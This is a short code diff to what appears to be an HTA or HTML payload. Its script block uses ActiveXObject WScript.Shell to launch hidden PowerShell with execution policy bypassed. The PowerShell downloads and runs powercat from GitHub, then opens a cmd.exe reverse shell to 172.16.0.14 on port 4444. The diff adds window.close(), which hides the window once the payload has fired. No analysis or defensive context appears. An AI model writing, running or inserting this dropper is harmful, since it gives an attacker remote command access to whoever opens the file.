@@ -1,4 +1,5 @@
 <script>
 var shell = "cmd.exe /c powershell.exe -nop -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'))\"\"; powercat -c 172.16.0.14 -p 4444 -e cmd.exe";
 new ActiveXObject('WScript.Shell').Run(shell);
+window.close();
 </script>
